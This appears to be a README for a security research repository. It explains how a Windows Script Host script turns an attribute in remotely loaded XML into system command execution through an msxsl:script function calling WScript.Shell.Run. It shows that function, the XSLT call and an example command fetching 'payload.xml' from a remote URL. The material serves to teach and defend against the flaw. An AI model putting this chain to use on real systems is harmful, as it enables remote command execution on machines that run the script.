## Overview

The included `.wsf` script processes an external XML file and applies a
dynamically constructed XSLT stylesheet. When certain unsafe features
are enabled, attacker-controlled XML attributes may be interpreted by
the XSLT engine in a way that causes system-level commands to be
executed.

## Legal and Ethical Notice

-   Do not use this code on systems you do not own or administer.
-   Do not use this in production environments.
-   This repository exists only for defensive research, auditing, and
    educational security analysis.

No responsibility is taken for misuse.

## How the RCE Behavior Occurs (Detailed Technical Explanation)

The behavior often described as Remote Code Execution (RCE) arises from
a chain of unsafe interactions within the script. Although no individual
component is inherently vulnerable, the combination results in a
situation where external input indirectly triggers system command
execution.

### 1. External XML Loading

The script invokes:

    xml.load(url)

This loads XML from an external, potentially untrusted URL. Any
attribute within this XML becomes attacker-controlled input.

### 2. Extraction of Attacker-Controlled Attribute

The script extracts the root element's attribute:

    c = LCase(xml.documentElement.getAttribute("command"))

This value is used later in a position where it influences executable
behavior. Because the attribute originates from external XML, its
content can be controlled by an attacker.

### 3. Construction of XSLT Containing Script Execution Functionality

The script programmatically builds an XSLT stylesheet that includes a
`msxsl:script` block. This block defines a function:

    function exec(c) {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run(c, 0, true);
        return '';
    }

This function uses `ActiveXObject("WScript.Shell")`, which exposes the
ability to execute system commands through the Windows Script Host
environment.

### 4. XSLT Template Invoking the Script Function

The generated XSLT template invokes the above script function using:

    <xsl:value-of select='user:exec("COMMAND")'/>

The string inserted into `"COMMAND"` is the attacker-controlled
attribute extracted earlier. This creates a direct data-to-execution
path.

### 5. Resulting RCE Chain

Putting all components together:

1.  External XML supplies attacker-controlled attribute.
2.  Script reads the attribute without validation.
3.  Attribute is embedded directly into an executable XSLT context.
4.  XSLT calls a scripting function implemented with `ActiveXObject`.
5.  The scripting function runs system-level commands.

This chain is why the behavior is classified as RCE: external data
influences a function (`exec`) that ultimately calls
`WScript.Shell.Run()`, causing execution of arbitrary system commands.

The issue is not with MSXML itself; the unsafe behavior arises from
combining untrusted input, dynamic XSLT generation, and
command-executing extension functions.

## File Usage

Example invocation:

    cscript.exe program.wsf https://example.com/payload.xml

Use this only in controlled environments for research or testing.

## Security Lessons

-   Do not load XML from untrusted sources.
-   Do not use `msxsl:script` in modern systems.
-   Do not allow external data to influence scripting or executable
    contexts.
-   Avoid ActiveXObject usage.
-   Use secure XML parsers with restricted features.

## Relevant Conceptual CWE Categories

-   CWE-94: Improper Control of Code Generation
-   CWE-611: Improper Restriction of XML External Entity Reference
-   CWE-915: Improperly Controlled Modification of
    Dynamically-Determined Attributes
-   CWE-116: Improper Encoding or Escaping

